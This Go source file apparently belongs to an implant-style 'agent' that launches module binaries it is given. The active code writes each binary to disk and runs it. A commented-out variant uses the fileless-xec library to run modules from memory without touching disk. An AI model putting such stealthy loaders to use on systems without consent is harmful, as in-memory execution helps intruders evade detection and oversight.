//go:build !windows
// +build !windows

package agent

import (
	"fmt"
	"os"

	"github.com/ariary/fileless-xec/pkg/exec"
	encryption "github.com/ariary/go-utils/pkg/encrypt"
)

// //LaunchModule: execute module (not write into disk if on linux or macOS)
// func LaunchModule(moduleBinaryContent string, socketName chan string) {
// 	mfd := exec.PrepareStealthExec(moduleBinaryContent)
// 	defer mfd.Close()
// 	fd := mfd.Fd()

// 	name := SOCKET + "." + encryption.GenerateRandom()

// 	os.Setenv(COCO_SOCKET_ENVVAR, name)
// 	environ := os.Environ()
// 	socketName <- name
// 	if err := exec.FexecveDaemon(fd, nil, environ); err != nil {
// 		fmt.Println("Failed to exec module:", err)
// 	}
// 	//Fexecve(fd, cfg.ArgsExec, cfg.Environ) //all line after that won't be executed due to syscall execve;
// }

//LaunchModule: execute module (not write into disk if on linux or macOS)
func LaunchModule(moduleBinaryContent string, socketName chan string) {
	binary := "dummy"
	//write binary file locally
	err := exec.WriteBinaryFile(binary, moduleBinaryContent)
	if err != nil {
		fmt.Println(err)
	}

	//execute it
	name := SOCKET + "." + encryption.GenerateRandom()
	os.Setenv(COCO_SOCKET_ENVVAR, name)
	environ := os.Environ()
	socketName <- name
	err = exec.UnstealthyExec(binary, nil, environ)
	fmt.Println(err)
}
